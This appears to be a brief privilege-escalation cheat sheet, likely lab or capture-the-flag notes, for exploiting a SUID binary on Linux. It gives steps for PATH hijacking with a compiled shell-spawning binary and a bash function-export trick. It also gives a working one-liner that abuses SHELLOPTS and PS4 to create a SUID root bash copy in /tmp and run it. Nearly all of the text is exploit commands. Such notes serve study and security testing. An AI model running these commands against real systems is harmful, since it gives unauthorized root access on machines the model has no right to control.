# Example:

### 1: /usr/local/bin/example-env

### 2: strings /usr/local/bin/example-env

### 3: gcc -o service /path/to/file.c (The code spawns bash shell. Works only if the full path of the original executable is NOT being used)

### 4: PATH=.:$PATH /usr/local/bin/example-env

## TIP: 

### If the absolute path of an executable is used (strings) we can do:

#### 1: Check bash version: /bin/bash --version

#### 2: function /path/to/file {/bin/bash -p;}

#### 3: Run executable

### Example:

#### env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/example2-env

#### /tmp/rootbash -p

## Note: Doesn't work on Bash versions 4.4 and above!
